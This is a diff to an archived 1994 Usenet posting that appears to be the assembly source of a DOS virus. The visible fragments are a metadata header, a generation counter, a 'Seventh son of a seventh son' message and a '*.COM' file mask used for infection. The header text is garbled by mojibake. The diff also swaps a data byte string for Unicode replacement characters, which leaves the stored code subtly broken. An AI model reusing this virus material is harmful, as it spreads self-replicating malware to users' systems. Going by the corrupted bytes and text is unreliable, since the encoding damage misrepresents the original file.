@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      0 9
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 From netcom.com!ix.netcom.com!netnews Tue Nov 29 09:42:48 1994
 Xref: netcom.com alt.comp.virus:506
 Path: netcom.com!ix.netcom.com!netnews
@@ -239,7 +250,7 @@ ni24:           mov     al,03
 generation      db      1,1
 sontxt          db      'Seventh son of a seventh son',0Dh, 0Ah, '$'
 filename        db      '*.COM',0
-                db      '‚¨°³±'
+                db      'ï¿½ï¿½ï¿½ï¿½ï¿½'
 
 end:
 
